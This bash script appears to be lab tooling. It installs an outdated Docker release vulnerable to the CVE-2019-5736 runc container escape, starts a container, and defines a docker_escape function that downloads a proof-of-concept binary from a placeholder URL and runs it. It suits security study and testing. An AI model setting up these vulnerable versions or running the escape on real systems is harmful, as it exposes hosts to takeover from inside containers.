#!/bin/bash
# date: 20190523
# author: thinkycx
# Description: you can use this to install vulnerable docker ( CVE-2019-5736 docker runc escape )
#              tested on centos7/ubuntu16.04
# Usage:
#       1. curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh
#       2. run docker_escape in docker container
# 



_centos_docker_old_version(){
    sudo yum install containerd.io
    wget https://download.docker.com/linux/centos/7/x86_64/stable/Packages/docker-ce-18.06.0.ce-3.el7.x86_64.rpm
    sudo yum install docker-ce-18.06.0.ce-3.el7.x86_64.rpm
    # sudo yum install docker-ce-cli
    # I cannot find a version matches with the docker-ce, so I didn't install it.

    # docker --version
    # Docker version 18.06.0-ce, build 0ffa825

    # more info
    # It seems that we can use the scirpt to install docker. I haven't tested it.
    # apt-get -y install curl
    # curl -fsSL test.docker.com -o test-docker.sh
    # VERSION=18.03.1 sh test-docker.sh
}

centos_install_docker(){
    # date 20190523
    # ref https://docs.docker.com/install/linux/docker-ce/centos/#install-using-the-convenience-script
    echo "[*] uninstall old..."
    sudo yum remove docker \
                  docker-client \
                  docker-client-latest \
                  docker-common \
                  docker-latest \
                  docker-latest-logrotate \
                  docker-logrotate \
                  docker-engine
    # The contents of /var/lib/docker/, including images, containers, volumes, and networks, are preserved. 
    # The Docker CE package is now called docker-ce

    # Install using the repository
    ## SET UP THE REPOSITORY
    ### Install required packages. yum-utils provides the yum-config-manager utility
    sudo yum install -y yum-utils \
                device-mapper-persistent-data \
                lvm2
    ### set up the stable repository.
    sudo yum-config-manager \
    --add-repo \
    https://download.docker.com/linux/centos/docker-ce.repo


    # install a specific version of Docker CE
    #yum list docker-ce --showduplicates | sort -r

    # sudo yum install docker-ce-<VERSION_STRING> docker-ce-cli-<VERSION_STRING> containerd.io
    # e.g docker-ce-18.09.1
    #sudo yum install docker-ce-18.09.6 docker-ce-cli-18.09.6 containerd.io

    # check  GPG key, verify that the fingerprint matches
    # 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35

    _centos_docker_old_version

    sudo systemctl start docker
}

ubuntu_install_docker(){
    # use script to install docker on ubuntu
    curl -fsSL https://get.docker.com -o get-docker.sh && \
    sudo VERSION=18.06.0 sh get-docker.sh
    sudo systemctl start docker

}


install_dependencies(){
        source /etc/os-release
        echo "OS: ", $ID 
        if [ $ID == "centos" ]; then
          centos_install_docker
        elif [ $ID == "ubuntu" ]; then
          ubuntu_install_docker
        else
          echo "[!] cannot support your OS."
          exit
        fi 
        echo "[*] start to run docker..."
        docker run -it ubuntu:18.04 "/bin/bash" 
}


# bash main...
install_dependencies

# Please run it manually in docker container.
docker_escape(){
    # run commands in container as to escape docker container . 
    # yous should compile POC yourself
    # https://github.com/Frichetten/CVE-2019-5736-PoC
    # compile main.go on macOS :
    # $ CGO_ENABLED=0 GOOS=linux GOARCH=amd64  go build -o poc main.go 
    apt-get update -y && \
    apt-get install curl -y  && \
    apt-get install libseccomp-dev -y 

    curl URL -o poc && \            
    chmod u+x ./poc
    ./poc
}


